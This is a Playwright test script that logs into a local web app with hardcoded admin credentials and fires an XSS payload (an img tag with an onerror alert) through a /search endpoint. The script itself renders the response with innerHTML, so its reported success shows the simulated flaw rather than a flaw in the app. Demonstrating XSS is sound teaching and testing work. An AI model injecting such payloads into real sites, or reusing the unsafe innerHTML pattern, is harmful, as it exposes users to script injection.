/**
 * XSS Vulnerability Test Script using Playwright
 * 
 * This script demonstrates how an XSS attack works when user input is rendered using innerHTML (unsafe)
 * vs textContent (safe).
 * 
 * Test scenario:
 * 1. Navigate to the target application
 * 2. Login with admin credentials
 * 3. Use fetch to call /search?q= with XSS payload
 * 4. Simulate innerHTML rendering (unsafe) to trigger XSS
 * 5. Capture screenshot if alert is executed
 */

const { chromium } = require('playwright');

const TARGET_URL = 'http://host.docker.internal:8080/';
const USERNAME = 'admin';
const PASSWORD = 'password123';
const XSS_PAYLOAD = "<img src=x onerror=alert('EXPLOITED')>";

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function runXssTest() {
  console.log('=== Starting XSS Vulnerability Test ===\n');
  
  let browser;
  let context;
  let page;
  
  try {
    // Launch browser - use system chromium
    console.log('[1] Launching browser (headless mode with system Chromium)...');
    browser = await chromium.launch({ 
      headless: true,
      executablePath: '/usr/bin/chromium',  // Use system chromium
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-gpu',
        '--disable-software-rasterizer'
      ]
    });
    
    context = await browser.newContext({
      viewport: { width: 1280, height: 720 }
    });
    page = await context.newPage();
    
    // Set up dialog handler to catch alerts
    let alertDialog = null;
    let alertMessage = null;
    
    page.on('dialog', async dialog => {
      alertDialog = dialog;
      alertMessage = dialog.message();
      console.log(`[+] Dialog detected: ${dialog.type()} - "${dialog.message()}"`);
      // Accept the dialog
      await dialog.accept();
    });
    
    // Step 1: Navigate to target URL
    console.log(`[2] Navigating to ${TARGET_URL}...`);
    await page.goto(TARGET_URL, { waitUntil: 'networkidle', timeout: 30000 });
    await sleep(1000);
    
    // Take initial screenshot
    await page.screenshot({ path: 'screenshot-01-initial.png' });
    
    // Step 2: Login
    console.log('[3] Logging in...');
    console.log(`    Username: ${USERNAME}`);
    console.log(`    Password: ${PASSWORD}`);
    
    // Fill login form
    await page.fill('#username', USERNAME);
    await page.fill('#password', PASSWORD);
    
    // Click login button
    await page.click('button[type="submit"]');
    
    // Wait for login to complete and dashboard to appear
    await page.waitForSelector('#dashboardSection.active', { timeout: 10000 });
    console.log('[+] Login successful!');
    
    // Wait for the page to settle
    await sleep(1500);
    
    // Take screenshot after login
    await page.screenshot({ path: 'screenshot-02-after-login.png' });
    
    // Step 3: Navigate to comment section (has the search form)
    console.log('[4] Navigating to Comment Management tab...');
    await page.click('button:has-text("评论管理")');
    await sleep(500);
    
    // Take screenshot of comment section
    await page.screenshot({ path: 'screenshot-03-comment-section.png' });
    
    // Step 4: Create a test function that:
    // - Calls fetch with /search?q= XSS payload
    // - Simulates innerHTML rendering (unsafe way)
    console.log('[5] Executing XSS payload via innerHTML injection...');
    console.log(`    Payload: ${XSS_PAYLOAD}`);
    
    // Execute the XSS attack using innerHTML (the vulnerable way)
    const xssResult = await page.evaluate(async (payload) => {
      try {
        // Call the /search API with XSS payload
        const response = await fetch(`/search?q=${encodeURIComponent(payload)}`);
        const data = await response.json();
        
        console.log('API Response:', JSON.stringify(data));
        
        // Create a container element
        const container = document.createElement('div');
        container.id = 'xss-test-container';
        
        // Inject into page body
        document.body.appendChild(container);
        
        // UNSAFE: Using innerHTML - this WILL trigger XSS
        container.innerHTML = data.query;
        
        console.log('XSS payload injected via innerHTML');
        return { success: true, query: data.query };
      } catch (e) {
        console.error('Error:', e.message);
        return { success: false, error: e.message };
      }
    }, XSS_PAYLOAD);
    
    console.log(`    XSS injection result:`, xssResult);
    
    // Wait for potential dialog
    console.log('[6] Waiting for alert dialog...');
    await sleep(2000);
    
    // Take screenshot after XSS injection
    await page.screenshot({ path: 'screenshot-04-after-xss.png' });
    
    // Step 5: Check if alert was executed
    if (alertDialog) {
      console.log('\n========================================');
      console.log('[✓] XSS ATTACK SUCCESSFUL!');
      console.log('========================================');
      console.log(`    Alert dialog appeared with message: "${alertMessage}"`);
      console.log('    The payload was executed via innerHTML');
      
      // Capture screenshot
      console.log('[7] Taking screenshot...');
      await page.screenshot({ 
        path: 'xss-exploit-successful.png', 
        fullPage: true 
      });
      console.log('    Screenshot saved to: xss-exploit-successful.png');
      
      console.log('\n=== Test Result: PASSED ===');
      console.log('The XSS vulnerability was successfully demonstrated.');
      console.log('When user input is rendered using innerHTML, XSS attacks are possible.\n');
      
      await browser.close();
      return { success: true, message: 'XSS exploit successful' };
    } else {
      console.log('\n[✗] No alert dialog was detected.');
      console.log('    This could mean:');
      console.log('    - The innerHTML injection did not work');
      console.log('    - The browser blocked the execution');
      
      // Take a screenshot anyway
      await page.screenshot({ 
        path: 'xss-test-failed.png', 
        fullPage: true 
      });
      
      await browser.close();
      return { success: false, message: 'XSS exploit failed - no alert detected' };
    }
    
  } catch (error) {
    console.error('\n[✗] Test failed with error:', error.message);
    console.error(error.stack);
    
    // Take screenshot on error
    if (page) {
      try {
        await page.screenshot({ 
          path: 'xss-test-error.png', 
          fullPage: true 
        });
      } catch (e) {
        console.error('Failed to take error screenshot:', e.message);
      }
    }
    
    if (browser) {
      await browser.close();
    }
    
    return { success: false, message: error.message };
  }
}

// Run the test
runXssTest()
  .then(result => {
    console.log('\nFinal result:', result);
    process.exit(result.success ? 0 : 1);
  })
  .catch(err => {
    console.error('Unhandled error:', err);
    process.exit(1);
  });
